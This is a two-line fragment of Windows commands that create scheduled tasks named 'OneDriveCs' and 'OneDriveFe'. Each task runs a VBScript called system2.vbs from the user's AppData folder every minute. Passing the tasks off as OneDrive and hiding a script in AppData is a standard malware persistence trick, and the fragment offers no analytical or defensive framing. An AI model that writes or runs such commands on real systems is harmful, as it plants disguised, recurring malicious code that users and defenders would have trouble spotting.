schtasks /create /tn "OneDriveCs" /sc minute /mo 1 /tr "%appdata%\system2.vbs"
schtasks /create /tn "OneDriveFe" /sc minute /mo 1 /tr "%appdata%\system2.vbs"
